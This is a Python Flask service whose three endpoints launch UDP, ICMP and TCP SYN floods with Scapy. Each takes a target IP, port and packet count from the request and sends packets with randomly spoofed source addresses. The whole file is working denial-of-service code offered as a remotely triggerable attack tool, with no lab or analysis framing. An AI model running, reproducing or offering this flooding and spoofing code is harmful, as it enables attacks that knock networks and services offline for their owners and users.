import time
from flask import Flask
import sys
from scapy.all import *
from flask import request

app = Flask(__name__)

def randomIP():
    ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
    return ip

def randPort():
    x = random.randint(0, 64000)
    return x

@app.route('/udp')
def udp_flood():
    dest_ip_address = request.args.get('ip')
    dest_port = int(request.args.get('port'))
    pkt_count = int(request.args.get('pktCount'))

    for i in range(0, pkt_count):
        #Generate radnomIP address to indicate the source
        src_ip = randomIP()
        #create an IP packet from source IP to destination IP
        packet = IP(src=str(src_ip), dst=dest_ip_address)
        #Create UDP object to given destination port
        udp = UDP(dport=dest_port)
        #Create packet from IP packet and UDP Object
        pkt = packet/udp
        #Send request
        send(pkt)
    return "Success"


@app.route('/icmp')
def icmp_flood():
    dest_ip_address = request.args.get('ip')
    dest_port = int(request.args.get('port'))
    pkt_count = int(request.args.get('pktCount'))

    for i in range(0, pkt_count):
	    #Generate radnomIP address to indicate the source
        src_ip = randomIP()
        #create an IP packet from source IP to destination IP
        packet = IP(src=str(src_ip), dst=dest_ip_address)
        #Create packet from IP packet and ICMP Object
        pkt = packet/ICMP()
        #Send request
        send(pkt)
    return "Success"

@app.route('/tcp')
def tcp_flood():
    dest_ip_address = request.args.get('ip')
    dest_port = int(request.args.get('port'))
    pkt_count = int(request.args.get('pktCount'))

    for i in range(0, pkt_count):
        #Generate radnomIP address to indicate the source
        src_ip = randomIP()
        #create an IP packet from source IP to destination IP
        packet = IP(src=str(src_ip), dst=dest_ip_address)
        #Create TCP object with random source port and given destination port
        tcp = TCP(sport=RandShort(), dport=dest_port, flags="S")
        #Create packet from IP packet and TCP Object
        pkt = packet/tcp
        #Send request
        send(pkt)
    return "Success"


